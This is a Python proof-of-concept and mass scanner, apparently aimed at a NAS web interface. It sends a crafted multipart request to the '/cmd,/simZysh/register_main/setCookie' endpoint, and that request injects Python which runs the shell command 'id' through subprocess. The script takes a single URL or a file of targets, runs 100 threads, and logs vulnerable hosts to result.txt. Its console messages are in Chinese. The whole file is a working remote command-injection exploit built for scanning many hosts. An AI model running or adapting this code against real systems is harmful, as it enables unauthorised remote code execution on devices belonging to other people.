import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███╗   ██╗ █████╗ ███████╗███████╗███████╗████████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗
████╗  ██║██╔══██╗██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝
██╔██╗ ██║███████║███████╗███████╗█████╗     ██║   ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗  
██║╚██╗██║██╔══██║╚════██║╚════██║██╔══╝     ██║   ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝  
██║ ╚████║██║  ██║███████║███████║███████╗   ██║   ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                           
                                                                                version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/cmd,/simZysh/register_main/setCookie"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Length': '235',
        'Content-Type': 'multipart/form-data; boundary=9bd1569218faca1ab1dbbefdfa574d30'
    }
    data = (
        "--9bd1569218faca1ab1dbbefdfa574d30\r\n"
        'Content-Disposition: form-data; name="c0"\r\n'
        "\r\n"
        'storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#\r\n'
        "--9bd1569218faca1ab1dbbefdfa574d30--\r\n"
    )
    # proxie = {
    #     'http' : 'http://127.0.0.1:8080',
    #     'https' : 'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "uid" in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()